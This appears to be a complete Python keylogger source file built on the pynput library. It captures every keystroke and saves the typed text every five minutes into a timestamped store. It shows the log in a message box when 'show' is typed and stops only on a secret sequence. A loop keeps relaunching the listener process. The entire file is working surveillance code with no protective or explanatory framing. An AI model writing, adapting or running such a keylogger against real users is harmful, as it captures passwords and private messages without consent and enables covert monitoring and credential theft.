from pynput import keyboard
import threading
from time_stamp import *
from msgbox import *
from multiprocessing import Process

input_keys = []
all_keys = []
memory = {}


###     on press akey       ###
def on_press(key):
    try:
        input_keys.append(key.char)
        all_keys.append(key.char)
    except:
        if str(key) == 'Key.space':
            input_keys.append(' ')
        elif str(key) == 'Key.enter':
            input_keys.append('\n')
        else:
            pass

###     stop monitoring or show memory     ###
def on_release(key):
    try:
        show = all_keys[-4:] == ['s','h','o','w'] or input_keys[-4:] == ['s','h','o','w']
        stop = all_keys[-4:] == ['c','k','l','5'] or input_keys[-4:] == ['c','k','l','5']
        if show:
        ###     enter 'show' to view the last memory keys       ###
            for i in range(4):
                input_keys.pop()
            print(memory)
            print_memory()
        ###     press "c + k" to stop monitoring       ###
        if stop:
            for i in range(4):
                input_keys.pop()
            msgbox('Monitoring is stoped !')
            return False
        else:
            pass
    except:
        pass

###     save text from last 5 minutes in memory     ###
def save_to_memory():
    global input_keys, memory
    if input_keys:
        text = "".join(input_keys)
        memory[time_stamp()] = text
        input_keys = []
    ### timer   ###
    threading.Timer(300, save_to_memory).start()


###     print memory        ###
def print_memory():
    try:
        if memory:
            text = 'memory' + '\n' * 3
            for i in memory.values():
                text += i + '\n'
            msgbox(str(text))
        else:
            msgbox('The memory is empty !')
    except:
        msgbox('Error')


###     keyboard listener      ###
def my_listener():
    save_to_memory()
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

def run_listener_forever():
    while True:
        p = Process(target=my_listener)
        p.start()
        p.join()
        p.terminate()

if __name__ == '__main__':
###     run KeyLogger       ###
    run_listener_forever()